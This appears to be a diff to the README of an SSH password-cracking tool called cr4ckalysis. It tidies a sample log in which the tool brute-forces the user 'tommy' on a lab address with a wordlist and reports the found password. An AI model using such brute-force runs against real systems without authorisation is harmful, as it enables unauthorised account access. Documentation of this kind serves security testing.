@@ -340,108 +340,51 @@ cr4ckalysis> set_pword ./testpass.txt
 ```
 Now, we can sufficient information to crack SSH credentials by using command `crack ipv4 ssh`.
 ```
-cr4ckalysis> crack ipv4 ssh                                                                  
-                                                                                             
-[*] Checking SSH port state on: 192.168.25.142                                               
-[+] SSH status on 192.168.25.142: active (running)                                           
-[+] Connection successful.                                                                   
-[+] Loading username: tommy                                                                  
-[+] Loading passlist: ./testpass.txt                                                         
-[*] Testing combination (u:p): tommy:password                                                
-[*] Testing combination (u:p): tommy:password                                                
-[*] Testing combination (u:p): tommy:password1                                               
-[*] Testing combination (u:p): tommy:password1                                               
-[*] Testing combination (u:p): tommy:password12                                              
-[*] Testing combination (u:p): tommy:password12                                              
-[*] Testing combination (u:p): tommy:password2                                               
-[*] Testing combination (u:p): tommy:password2                                               
-[*] Testing combination (u:p): tommy:password123                                             
-[*] Testing combination (u:p): tommy:password123                                             
-[*] Testing combination (u:p): tommy:password4                                               
-[*] Testing combination (u:p): tommy:password4                                               
-[*] Testing combination (u:p): tommy:password133                                             
-[*] Testing combination (u:p): tommy:password133                                             
-[*] Testing combination (u:p): tommy:password231                                             
-[*] Testing combination (u:p): tommy:password231                                             
-[*] Testing combination (u:p): tommy:password21                                              
-[*] Testing combination (u:p): tommy:password21                                              
-[*] Testing combination (u:p): tommy:password1233                                            
-[*] Testing combination (u:p): tommy:password1233                                            
-[*] Testing combination (u:p): tommy:password1234                                            
-[*] Testing combination (u:p): tommy:password1234                                            
-[*] Testing combination (u:p): tommy:password321                                             
-[*] Testing combination (u:p): tommy:password321                                             
-[*] Testing combination (u:p): tommy:Password123                                             
-[*] Testing combination (u:p): tommy:Password123                                             
-[*] Testing combination (u:p): tommy:Password1                                               
-[*] Testing combination (u:p): tommy:Password1                                               
-[*] Testing combination (u:p): tommy:Password                                                
-[*] Testing combination (u:p): tommy:Password                                                
-[*] Testing combination (u:p): tommy:Password12                                              
-[*] Testing combination (u:p): tommy:Password12                                              
-[*] Testing combination (u:p): tommy:P@ssword                                                
-[*] Testing combination (u:p): tommy:P@ssword                                                
-[*] Testing combination (u:p): tommy:P@ssw0rd                                                
-[*] Testing combination (u:p): tommy:P@ssw0rd                                                
-[*] Testing combination (u:p): tommy:p@ssw0rd                                                
-[*] Testing combination (u:p): tommy:p@ssw0rd                                                
-[*] Testing combination (u:p): tommy:p@$$w0rd                                                
-[*] Testing combination (u:p): tommy:p@$$w0rd                                                
-[*] Testing combination (u:p): tommy:p@s$w0rd                                                
-[*] Testing combination (u:p): tommy:p@s$w0rd                                                
-[*] Testing combination (u:p): tommy:Pa$$w0rd                                                
-[*] Testing combination (u:p): tommy:Pa$$w0rd                                                
-[*] Testing combination (u:p): tommy:P@ssword123                                             
-[*] Testing combination (u:p): tommy:P@ssword123                                             
-[*] Testing combination (u:p): tommy:passpass                                                
-[*] Testing combination (u:p): tommy:passpass                                                
-[*] Testing combination (u:p): tommy:mypass123                                               
-[*] Testing combination (u:p): tommy:mypass123                                               
-[*] Testing combination (u:p): tommy:MyPass123                                               
-[*] Testing combination (u:p): tommy:MyPass123                                               
-[*] Testing combination (u:p): tommy:123password                                             
-[*] Testing combination (u:p): tommy:123password                                             
-[*] Testing combination (u:p): tommy:12password                                              
-[*] Testing combination (u:p): tommy:12password                                              
-[*] Testing combination (u:p): tommy:1password                                               
-[*] Testing combination (u:p): tommy:1password                                               
-[*] Testing combination (u:p): tommy:1pass                                                   
-[*] Testing combination (u:p): tommy:1pass                                                   
-[*] Testing combination (u:p): tommy:Password!                                               
-[*] Testing combination (u:p): tommy:Password!                                               
-[*] Testing combination (u:p): tommy:password!                                               
-[*] Testing combination (u:p): tommy:password!                                               
-[*] Testing combination (u:p): tommy:passw0rd!!                                              
-[*] Testing combination (u:p): tommy:passw0rd!!                                              
-[*] Testing combination (u:p): tommy:password!!                                              
-[*] Testing combination (u:p): tommy:password!!                                              
-[*] Testing combination (u:p): tommy:p@ssword!                                               
-[*] Testing combination (u:p): tommy:p@ssword!                                               
-[*] Testing combination (u:p): tommy:P@s$w0rd!                                               
-[*] Testing combination (u:p): tommy:P@s$w0rd!                                               
-[*] Testing combination (u:p): tommy:password12345                                           
-[*] Testing combination (u:p): tommy:password12345                                           
-[*] Testing combination (u:p): tommy:1234password                                            
-[*] Testing combination (u:p): tommy:1234password                                            
-[*] Testing combination (u:p): tommy:password6                                               
-[*] Testing combination (u:p): tommy:password6                                               
-[*] Testing combination (u:p): tommy:wordpass123                                             
-[*] Testing combination (u:p): tommy:wordpass123                                             
-[*] Testing combination (u:p): tommy:wordpass                                                
-[*] Testing combination (u:p): tommy:wordpass                                                
-[*] Testing combination (u:p): tommy:wordpass12                                              
-[*] Testing combination (u:p): tommy:wordpass12                                              
-[*] Testing combination (u:p): tommy:wordpass1                                               
-[*] Testing combination (u:p): tommy:wordpass1                                               
-[*] Testing combination (u:p): tommy:1wordpass                                               
-[*] Testing combination (u:p): tommy:1wordpass                                               
-[*] Testing combination (u:p): tommy:password0123                                            
-[*] Testing combination (u:p): tommy:password0123                                            
-[*] Testing combination (u:p): tommy:password012                                             
-[*] Testing combination (u:p): tommy:password012                                             
-[+] Valid credentials found.    [USER]:tommy    [PASS]:password123                           
-[*] Testing combination (u:p): tommy:password0                                               
-[*] Testing combination (u:p): tommy:password0                                               
+cr4ckalysis> crack ipv4 ssh                                               
+                                                                          
+[*] Checking SSH port state on: 192.168.25.142                            
+[+] SSH status on 192.168.25.142: active (running)                        
+[+] Connection successful.                                                
+[+] Loading username: tommy                                               
+[+] Loading passlist: ./testpass.txt                                      
+[*] Testing combination (u:p): tommy:password                             
+[*] Testing combination (u:p): tommy:password1                            
+[*] Testing combination (u:p): tommy:password12                           
+[*] Testing combination (u:p): tommy:password2                            
+[*] Testing combination (u:p): tommy:password123                          
+[*] Testing combination (u:p): tommy:password4                            
+[*] Testing combination (u:p): tommy:password133                          
+[*] Testing combination (u:p): tommy:password231                          
+[*] Testing combination (u:p): tommy:password21                           
+[*] Testing combination (u:p): tommy:password1233                         
+[*] Testing combination (u:p): tommy:password1234                         
+[*] Testing combination (u:p): tommy:password321                          
+[*] Testing combination (u:p): tommy:Password123                          
+[*] Testing combination (u:p): tommy:Password1                            
+[*] Testing combination (u:p): tommy:Password                             
+[*] Testing combination (u:p): tommy:Password12                           
+[*] Testing combination (u:p): tommy:P@ssword                             
+[*] Testing combination (u:p): tommy:P@ssw0rd                             
+[*] Testing combination (u:p): tommy:p@ssw0rd                             
+[*] Testing combination (u:p): tommy:p@$$w0rd                             
+[*] Testing combination (u:p): tommy:p@s$w0rd                             
+[*] Testing combination (u:p): tommy:Pa$$w0rd                             
+[*] Testing combination (u:p): tommy:P@ssword123                          
+[*] Testing combination (u:p): tommy:passpass                             
+[*] Testing combination (u:p): tommy:mypass123                            
+[*] Testing combination (u:p): tommy:MyPass123                            
+[*] Testing combination (u:p): tommy:123password                          
+[*] Testing combination (u:p): tommy:12password                           
+[*] Testing combination (u:p): tommy:1password                            
+[*] Testing combination (u:p): tommy:1pass                                
+[*] Testing combination (u:p): tommy:Password!                            
+[*] Testing combination (u:p): tommy:password!                            
+[*] Testing combination (u:p): tommy:passw0rd!!                           
+[*] Testing combination (u:p): tommy:password!!                           
+[*] Testing combination (u:p): tommy:p@ssword!                            
+[*] Testing combination (u:p): tommy:P@s$w0rd!                            
+[+] Valid credentials found.    [USER]:tommy    [PASS]:password123        
+[*] Testing combination (u:p): tommy:password12345                        
 [*] Process ended.
 ```
 ![image](https://user-images.githubusercontent.com/107750005/209805683-24f5bcc7-e586-413f-9142-3158e2c62ab9.png)
